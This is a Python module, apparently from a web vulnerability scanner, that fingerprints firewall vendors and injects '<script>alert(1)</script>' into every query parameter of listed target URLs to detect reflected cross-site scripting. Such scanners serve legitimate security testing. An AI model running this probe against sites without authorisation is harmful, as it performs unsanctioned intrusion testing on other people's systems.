import sys, os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from core.log_to_text import log_to_text, classify_severity

XSS_PAYLOAD = "<script>alert(1)</script>"

def load_targets(file_path):
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]

def inject_payload(url, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    for k in query:
        query[k] = payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def detect_waf(url):
    try:
        res = requests.get(url, timeout=5)
        waf_signs = ["cloudflare", "sucuri", "akamai", "imperva", "aws", "360wzb", "wallarm", "barracuda"]
        for sign in waf_signs:
            if sign in res.text.lower():
                return True, f"WAF Detected: {sign}"
        return False, "Bez WAF zaštite"
    except Exception:
        return False, "Greška pri detekciji WAF-a"

def run_xss_scan():
    print("[-] Pokrećem XSS test...")
    targets = load_targets("targets/targets.txt")

    for url in targets:
        print(f"[+] Testiram: {url}")
        waf_status, waf_info = detect_waf(url)
        print(f"[WAF] {waf_info}")

        test_url = inject_payload(url, XSS_PAYLOAD)

        try:
            r = requests.get(test_url, timeout=5)
            if XSS_PAYLOAD in r.text:
                rezultat = f"[!!] Moguća XSS ranjivost na {url} | WAF: {waf_info}"
            else:
                rezultat = f"[--] Nema refleksije | WAF: {waf_info}"
            print(rezultat)
            severity = classify_severity(rezultat)
            log_to_text(__file__, rezultat + f' | Severity: {severity}')
        except Exception as e:
            error = f"[X] Greška pri slanju zahteva ka {url}: {str(e)}"
            print(error)
            severity = classify_severity(error)
            log_to_text(__file__, error + f' | Severity: {severity}')

if __name__ == "__main__":
    run_xss_scan()
